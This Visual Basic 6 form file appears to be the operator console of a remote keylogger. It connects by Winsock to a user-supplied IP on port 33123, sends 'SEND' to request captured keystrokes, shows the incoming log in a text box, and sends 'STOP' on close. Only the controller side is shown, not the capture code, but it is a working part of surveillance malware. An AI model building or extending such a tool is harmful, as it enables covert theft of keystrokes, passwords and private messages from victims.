VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form frmLOG 
   Caption         =   "LOG"
   ClientHeight    =   4185
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   7770
   LinkTopic       =   "Form1"
   ScaleHeight     =   4185
   ScaleWidth      =   7770
   StartUpPosition =   3  'Windows Default
   Begin MSWinsockLib.Winsock wsckKEYLOG 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.TextBox txtLOG 
      Height          =   3975
      Left            =   120
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   120
      Width           =   7575
   End
End
Attribute VB_Name = "frmLOG"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
wsckKEYLOG.Close
wsckKEYLOG.Connect FrmMain.txtIP.Text, 33123
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
Cancel = 1
Me.Hide
wsckKEYLOG.SendData "STOP"
Unload Me
End Sub

Private Sub Form_Resize()
On Error Resume Next
txtLOG.Width = ScaleWidth - 240
txtLOG.Height = ScaleHeight - 240
End Sub

Private Sub Form_Unload(Cancel As Integer)
Cancel = 1
Me.Hide
wsckKEYLOG.SendData "STOP"
Unload Me
End Sub

Private Sub wsckKEYLOG_Connect()
wsckKEYLOG.SendData "SEND"
End Sub

Private Sub wsckKEYLOG_DataArrival(ByVal bytesTotal As Long)
Dim LOG$
wsckKEYLOG.GetData LOG, vbString, bytesTotal
txtLOG.Text = txtLOG.Text & vbNewLine & LOG
End Sub

Private Sub wsckKEYLOG_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
MsgBox Description, vbCritical, App.Title
End Sub
